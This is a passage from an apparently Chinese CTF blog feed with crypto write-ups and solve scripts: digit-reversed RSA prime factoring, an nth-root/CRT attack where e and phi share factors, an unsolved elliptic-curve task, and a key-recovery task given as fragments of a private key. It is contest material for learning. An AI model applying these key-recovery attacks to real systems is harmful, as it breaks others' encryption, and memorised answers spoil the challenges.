class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>q是p的十进制数字反转(<code>emirp数</code>)<br /><a href="https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/">原题</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line">c = <span class="number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="comment"># sqrt(n) has 155 digits, so we need to figure out 77 digits on each side</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">77</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>(a, b)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="comment"># we try to guess the last not-already-guessed digits of both primes</span></span><br><span class="line">            a1 = a + i*(<span class="number">10</span>**k) + j*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">10</span>**k) + i*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too large</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">10</span>**(<span class="number">154</span>-k)))*(b1+(<span class="number">10</span>**(<span class="number">154</span>-k))) &lt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too small</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1) % (<span class="number">10</span>**(k+<span class="number">1</span>))) != (n % (<span class="number">10</span>**(k+<span class="number">1</span>))):</span><br><span class="line">                <span class="comment"># The last digits of a1*b1 (which won&#x27;t change later) doesn&#x27;t match n</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># this a1 and b1 seem to be a possible match, try to guess remaining digits</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    t(i*(<span class="number">10</span>**<span class="number">77</span>), i*(<span class="number">10</span>**<span class="number">77</span>), <span class="number">0</span>)</span><br><span class="line">p, q = <span class="number">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span>, <span class="number">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span></span><br><span class="line"><span class="built_in">print</span>(p*q == n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode()</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag).decode())</span><br></pre></td></tr></table></figure><p>拓展：如果是二进制数的反转呢？<br /><a href="https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/index.html#Reverse">见La佬的这篇博客</a></p><h3 id="seven-more"><a class="markdownIt-Anchor" href="#seven-more"></a> seven more</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMyPrime</span>(<span class="params">nbits, multiplier</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span> * multiplier * getPrime(nbits // <span class="number">2</span>) * getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> is_prime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_keys</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getMyPrime(nbits, <span class="number">1009</span> * <span class="number">7</span>)</span><br><span class="line">    q = getMyPrime(nbits, <span class="number">1009</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">1009</span> * <span class="number">7</span></span><br><span class="line">    <span class="keyword">return</span> p, q, n, e</span><br><span class="line"></span><br><span class="line">p, q, n, e = generate_keys(<span class="number">700</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;HECTF&#123;######&#125;&#x27;</span> + os.urandom(<span class="number">101</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; n.bit_length()</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &gt; q.bit_length()</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &gt; p.bit_length()</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line"><span class="comment">#c = 191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line"><span class="comment">#p = 31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line"><span class="comment">#q = 6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br></pre></td></tr></table></figure><p>先感谢一波<code>T0ver.</code> 我滴神！</p><p>我们知道<code>e</code>与<code>phi</code>并不互素，可以考虑<code>AMM算法</code>，这里直接上<a href="https://tover.xyz/p/n-root-in-F/#2024-11-30%E6%9B%B4%E6%96%B0">师兄的科技</a></p><p>小改一下下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">n = <span class="number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line">c = <span class="number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line">p = <span class="number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line">q = <span class="number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br><span class="line">e = <span class="number">1009</span>*<span class="number">7</span></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;HECTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="不合格的魔药unsolved"><a class="markdownIt-Anchor" href="#不合格的魔药unsolved"></a> 不合格的魔药(unsolved)</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> Curve</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A_function</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">512</span>)</span><br><span class="line">        q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">            n = p * q</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    a = randrange(p)</span><br><span class="line">    b = randrange(q)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1 = randrange(p)</span><br><span class="line">        y1 = (x1**<span class="number">3</span> + a*x1) % p</span><br><span class="line">        x2 = randrange(n)</span><br><span class="line">        y2 = (x2**<span class="number">3</span> + a*x2 + b) % n</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(y1,(p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">pow</span>(y1,(q-<span class="number">1</span>)//<span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">            yp = <span class="built_in">pow</span>(y1,p//<span class="number">4</span>+<span class="number">1</span>,p)</span><br><span class="line">            yq = <span class="built_in">pow</span>(y1,q//<span class="number">4</span>+<span class="number">1</span>,q)</span><br><span class="line">            _,s,t = gcdext(p,q)</span><br><span class="line">            y1 = (s*p*yq + t*q*yp) % p</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">pow</span>(y2,(p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">pow</span>(y2,(q-<span class="number">1</span>)//<span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">                yp = <span class="built_in">pow</span>(y2,p//<span class="number">4</span>+<span class="number">1</span>,p)</span><br><span class="line">                yq = <span class="built_in">pow</span>(y2,q//<span class="number">4</span>+<span class="number">1</span>,q)</span><br><span class="line">                _,s,t = gcdext(p,q)</span><br><span class="line">                y2 = (s*p*yq + t*q*yp) % n</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    Ep = Curve(<span class="literal">None</span>, p, a, <span class="number">0</span>, <span class="literal">None</span>, x1, y1) </span><br><span class="line">    En = Curve(<span class="literal">None</span>, n, a, b, <span class="literal">None</span>, x2, y2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>, q)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a =&quot;</span>, a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;b =&quot;</span>, b)</span><br><span class="line">    hint1 = key * Ep.G</span><br><span class="line">    hint = [x1 ,hint1]</span><br><span class="line">    <span class="keyword">return</span> En, hint</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A_encrypt</span>(<span class="params">m, G, k</span>):</span><br><span class="line">    blocks = [m[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m) // <span class="number">16</span>)]</span><br><span class="line">    ciph = []</span><br><span class="line">    aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        c = aes.encrypt(blocks[i])</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">            G = G + G</span><br><span class="line">            ciph.append(G.x ^ bytes_to_long(c))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ciph.append(G.y ^ bytes_to_long(c))</span><br><span class="line">    <span class="keyword">return</span> ciph               </span><br><span class="line"></span><br><span class="line">flag = secret.flag</span><br><span class="line">key = secret.key</span><br><span class="line"></span><br><span class="line">m = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b&#x27;HECTF&#123;&#x27;</span>+ m+ <span class="string">b&#x27;&#125;&#x27;</span> == flag</span><br><span class="line">A, hint = A_function(key)</span><br><span class="line">k = md5(long_to_bytes(key)).hexdigest().encode()</span><br><span class="line">c = A_encrypt(m, A.G,k)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint =&quot;</span>, hint)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 9604080254440553624043823039323876524034439909584709693304859297324410855942111467832096190746534800378359779991381701244554754870303658957438266614583487</span></span><br><span class="line"><span class="string">q = 7117529167860499983120234872664469946810713755399747931099511148595647881645694071900284496403308583631053530870961375928947111857317803005696543076720079</span></span><br><span class="line"><span class="string">a = 4681007517868949260473646867708411042804596292653498068045093108939357065240201843535644313612886376810286247810943227474659270191834401055704514648846995</span></span><br><span class="line"><span class="string">b = 5604862515726338933576748414825616582947323501967288114322080747741801017833194347273532400730033226601964489467416955741018175785792514035352083708135431</span></span><br><span class="line"><span class="string">hint = [5544706922427110224110125906620053049906095568886481576326706308027915868515721429471522223193053363494813044921519216114372968191072598748704528735817403, </span></span><br><span class="line"><span class="string">        X: 0x2fa8e23f18ed4a9bd752a0c22b0750c17fbb66c76554e2089258fd979a5736b7766c974fb9788acf17fb065dc1daec6a8a6e98021de6c4ce3cde11dd54590e1d</span></span><br><span class="line"><span class="string">        Y: 0xa3ce4bb1e25563b577a45cd06153d2dab584a70130c7ae71e65fe5e11b60493ccb845fbe4989dbd4a60d6a1ff12baa268b8833ed30f7c7e21c32268a139b5b6b</span></span><br><span class="line"><span class="string">        (On curve &lt;None&gt;)]</span></span><br><span class="line"><span class="string">c = [36780810764729391947601691590378765170863850291763672158886689602006275675399596108959250284869355070618680265311484525337488013177333417742808496794250706127014303883956401715343247310936978778751394980638177344654524711571648231122027699452582302505466999915200896495338587961829985149664712686944510559820, 20958199004445348755624931477686903609410629089817702686793041731031202915294487428236505796231417377524290926704880107242252471250791747709149963693453815320856114055076830778689575609444155241642860745570792018879816650383543271943138193405548674967958109800776284787612370057476837642989670234913968669332, 19758181515666300263334531148587391869707566215385658759724970483060039216682585723722462835458856503531814316860237786892749700501436669071048571605926728917066797641628644730857333648930286503355701843365288276242984029888215453858844295912023305616753086127934173496355853797241944921600781294012353332277, 45576628433681427718167093217006549620067042472164439269014690121698560736312716407875326404496263261341269644373184438703912129559084380247641072914940830606649124606611794031719696797961847217643536070335745057048220615012019629278484208808353027070994021979997462190775853832457224157083880895894000484461]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>还是曲线，没时间做了，看解出人数也是挺少的，而且还要做作业呢QWQ</p><h3 id="情书与破碎的证书再留个坑"><a class="markdownIt-Anchor" href="#情书与破碎的证书再留个坑"></a> 情书与破碎的证书(再留个坑？)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小明喜欢上了小红，他使用rsa向小红发送了无数封含有中文字符的情书。终于小红忍不住了，找到了大嘿阔将小明的私钥证书打成碎片，移除了中间的内容并把上下段的私钥部分转化成16进制，以九个为一组用相同的方式打乱（转化时产生的0d0a换行符已被移除）。作为密码学大佬的你能恢复证书，找出小红忍无可忍的证据么？</span><br><span class="line">提示1</span><br><span class="line">情书与破碎的证书 hint1:字符中含有中文 常规输出方法无效，请使用 PKCS1_OAEP 解密器，并使用 cipher.decrypt() 解密密文（毕竟考点是证书）</span><br></pre></td></tr></table></figure><p>证书</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0d30000102bc048230010df78648862a090630a604820400050101018202000102a20482238d771399dbbd0001416e7fbd7f589b44151fb0c984549c1c4d948984f85c35934453bfbb4dbb99420f63f9cb8f577a7b60d67bdf84166c500fa7d6c6e484b75d97e308151b31a49c5bd77dd1d2d6711e50d9f5f7bc37d4e2235cfd76a522713c766e240aa2eb5fb45a9015d1dbd6a58b5b28861233ae4eb75a97ced0b78e91024d195adde08f7430b7f160d1d60a4f9d0801db74ebc8c23f9397251faac5500d216acc623e8f6ab212b5e6e9495d5ef6cee995fea98f40b1db2d356dd3c4d2612c64a1295bb23936fad66dc5662cb4ba6a8929591f6b14ce30d67df5ec35edb1f0973f746bcc5fc1ca921ee9660e04c6f286677b92e12b61ba310501030219e5085e5254046204000182020100</span><br><span class="line">中间被打碎了d48d90d80f02818051a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf0281800fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd02818025c20ab2529f1efd3d35347c573b282abfd95b264c92f6c4f9ec8b7c713206fbea1886880e29a36c47ef9bb753ce9567ea4d3e083c30f344022f95b7cd7114813bf6a28ecc67d5fe05953242684cd29c1c5dd8a74416890e5c943c70904ba70e349b15719a466f901fbf0cfc7840f8032e31afbccfb84f4a817ea51c8f90fd6a2d2d2d2d2d454e442050524956415445204b45592d2d2d2d2d</span><br></pre></td></tr></table></figure><p><code>c</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x6f4cb0df50eb133f104727316eb23e25463b6b46a1ff743507c7663094da88a091c77c1d686a91613fa2da697c23924798b40654ba420b9690c5ceb9a362cf48e72c39177c6a3ebecc4e0ba2b9673f070a23e535fff7a01b400381ede60a6f9bf86047b3dd2c663c329b9287749bdb3783303802129b93af083aa2045c500fe0c2a7a018c2403881115927ae56ff14338b9fb98d5a5f461916d962aea7c3379ec7f7d8d77b4cc8ff756895c1500d9f2cee3552f17216339b0d67f27e0dd07e9ec1861f14c962b977559561d709d57e58fd6e6aafd27892c6d43d16b3db267902b9ce8f9ff89a66ab822b5ea3a68c872a32c69961df15581b70c00e4c61804d0d</span><br></pre></td></tr></table></figure><p>我以为要手撕证书，去看了一下师兄的<a href="https://tover.xyz/p/pem-by-hand/">这篇</a><br />不行，放弃了，本来就是来看一眼题目的</p><p>以后再补吧(?)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;国城杯&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#国城杯&quot;&gt;&lt;/a&gt; 国城杯&lt;/h1&gt;
&lt;p&gt;这次比赛的&lt;code&gt;web&lt;/code&gt;比较有难度(题解居然比&lt;code&gt;pwn&lt;/code&gt;少，而且是少很多很多)，交给学弟，然后学弟</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pcb2024-WriteUp</title>
    <link href="https://hvang10.github.io/2024/11/10/pcb2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/11/10/pcb2024-WriteUp/</id>
    <published>2024-11-10T09:25:26.000Z</published>
    <updated>2025-04-10T18:44:16.402Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="solved"><a class="markdownIt-Anchor" href="#solved"></a> SOLVED</h2><h3 id="babyenc-pcb2024"><a class="markdownIt-Anchor" href="#babyenc-pcb2024"></a> babyenc-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">42</span></span><br><span class="line">flag1 = flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]</span><br><span class="line">flag2 = flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(flag1.encode())</span><br><span class="line"><span class="built_in">print</span>(flag2.encode())</span><br><span class="line">m1 = bytes_to_long(flag1.encode())</span><br><span class="line">m2 = bytes_to_long(flag2.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e_gen</span>(<span class="params">bits</span>):</span><br><span class="line">    e = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> 